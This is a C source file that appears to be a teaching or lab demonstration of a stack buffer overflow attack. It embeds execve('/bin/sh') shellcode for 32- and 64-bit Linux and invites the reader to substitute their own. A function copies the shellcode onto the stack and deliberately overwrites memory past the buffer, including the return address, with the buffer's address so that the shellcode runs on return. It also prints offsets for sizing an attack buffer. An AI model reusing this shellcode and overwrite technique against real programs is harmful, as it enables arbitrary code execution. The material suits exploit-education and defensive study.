#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long long *hold;
int i;

//Replace the below shell code with your shell code.
//char shellcode[] ="\xeb\x09\x5b\xb0\x0b\x31\xc9\x89\xca\xcd\x80\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
char shellcode[]="\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x6a\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05";


unsigned long long get_sp(void) { 
  //__asm__("movq %rsp,%rax"); 
  __asm__("movl %esp,%eax");
} 



void dumb(char *arg)
{
  long long *test;
  hold=(unsigned long long *)&test;
  char filename[1024];   //Buffer to hold filename.
  printf("\nValue of Test:%llx",(unsigned long long)&test);
  printf("\nValue of filename[0]:%llx\n",(unsigned long long)filename);
  printf("The attack buffer is going to need to be a little bit bigger than:%llx\n",((unsigned long long)test-(unsigned long long)filename));
 
  strcpy (filename, shellcode);
  
  for (i=0;i<100;i++)
   {
     *hold=filename;
     hold=hold+1;
   }
  
  return;
}


int main(int argc, char* argv[])
{
  char holding[10000];        //This is just here as a buffer to try and keep you from overwriting main's return address, and into safe pages
  char *string;
  string=argv[1];             //string now points at the argument to main
  unsigned long long stack; 
  stack=get_sp();             //stack now points to the stack pointer.
  
    if(argc>1)                //Make sure that a filename was provided.
    {
      printf("\\Length of Input String:%d\\", strlen(string));
      dumb(argv[1]);   
    }
    else
      {
	printf("\n\nError: No Command Line arg for vuln was given\n\n");
	dumb("Useless Text");
      }
  return (0);
}
